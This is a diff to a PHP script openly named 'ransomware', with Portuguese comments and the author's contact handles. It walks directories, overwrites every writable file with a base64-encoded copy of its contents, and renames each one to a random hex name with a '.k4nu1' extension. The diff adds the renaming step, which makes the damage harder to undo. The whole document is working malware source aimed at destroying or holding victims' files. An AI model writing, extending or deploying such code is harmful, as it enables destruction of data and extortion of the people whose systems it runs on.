@@ -1,7 +1,5 @@
 <?php
 /*
-if you don't speak portuguese use google translator!
-
 GITHUB:https://github.com/Kanui-C
 TELEGRAM:@bdpwd
 DISCORD:!TheKanui#0105
@@ -22,8 +20,10 @@ class ransomware{
         Retorna o conteudo criptografado para o metodo ObterConteudo
         */
         return base64_encode($conteudo);
-        
-    
+    }
+    public function criptografanome($nome){
+        /* Alterando o nome do arquivo*/
+        return $nome = bin2hex(random_bytes(12));
     }
     //Metodo responsavel por obter o conteudo do arquivo
     public function ObterConteudo($alvo){
@@ -56,27 +56,31 @@ class ransomware{
                 de escrita
                 */
                 if($alvo != "." && $alvo != ".." && is_writable($alvo)){
-                  //Recebe o conteudo criptografado do metodo ObterConteudo
-                  $criptografado = $this->ObterConteudo($alvo);
-                  /*
-                  Abre o arquivo guardado na variavel alvo em modo de escrita
-                  Obs:Quando o arquivo é aberto apenas usando w 
-                  ele é automaticamente zerado!(Todo seu conteudo é apagado)
-                  */
-                  $escrever = fopen($alvo, "w");
-                  //Verifica se o arquivo foi aberto com sucesso!
-                  if($escrever){
-                      //Escreve o conteudo criptografado no arquivo alvo
-                      fwrite($escrever, $criptografado);
-                      //Fecha o arquivo
-                      fclose($escrever);
-                      //Retorna OK caso tenha dado certo
-                      echo "$alvo [Concluido]\n";
-                  }
-                  //Se nao foi possivel abrir o arquivo retorna failed
-                  else {
-                      echo "$alvo [Falha]\n";
-                  }
+                    //Recebe o conteudo criptografado do metodo ObterConteudo
+                    $criptografado = $this->ObterConteudo($alvo);
+                    /*
+                    Abre o arquivo guardado na variavel alvo em modo de escrita
+                    Obs:Quando o arquivo é aberto apenas usando w 
+                    ele é automaticamente zerado!(Todo seu conteudo é apagado)
+                    */
+                    $ext = '.k4nu1';
+                     $escrever = fopen($alvo, "w");
+                    //Verifica se o arquivo foi aberto com sucesso!
+                    if($escrever){
+                        //Escreve o conteudo criptografado no arquivo alvo
+                        fwrite($escrever, $criptografado);
+                        //Fecha o arquivo
+                        fclose($escrever);
+                        //Retorna OK caso tenha dado certo
+                        echo "$alvo [Concluido]\n";
+                        $criptonome = $this -> criptografanome($alvo);
+                        rename($alvo, $criptonome.$ext);
+                    }
+                    //Se nao foi possivel abrir o arquivo retorna failed
+                    else {
+                        echo "$alvo [Falha]\n";
+                    }
+                    
                 //Caso seja o diretorio '.' ou '..' ele retorna false e sai do if!
                 }else{
                     //"PULOU O DIRETORIO/ARQUIVO"
